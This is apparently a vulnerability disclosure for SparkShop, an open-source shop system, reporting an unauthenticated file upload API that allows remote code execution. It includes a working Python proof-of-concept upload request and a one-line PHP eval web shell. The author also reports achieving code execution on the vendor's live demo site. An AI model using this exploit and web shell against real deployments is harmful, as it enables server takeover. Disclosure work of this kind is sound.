### BUG_Author:

Rui Jie

### Affected version:

All

### Vendor:

Nanjing Xingyuantu Technology Co. 

### Software:

https://gitee.com/sparkshop/sparkshop
https://github.com/nick-bai/sparkshop

### Vulnerability File:

app/api/controller/Common.php

### Description:
File upload api with unauthorised access exists in all versions
![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202406271558047.png)
And there's no security check on the file upload part
![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202406271559268.png)
We can upload any file via unauthorised api for RCE purposes.
Here I have simply written a python-poc
```
import requests  
url='http://127.0.0.5/api/Common/uploadFile?XDEBUG_SESSION_START=17625'  
file={'file':open('D://shell.php','rb')}  
r = requests.post(url,files=file)  
print(r.text)
```
The contents of shell.php is just a plain old Trojan horse.
```
<?php eval($_POST[1]);?>
```
![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202406271602668.png)
Direct upload successfully returned the file address
![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202406271603682.png)
We achieved RCE by uploading a malicious php script

Meanwhile, I tested the official demo site and it can also achieve rce
![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202406271735213.png)
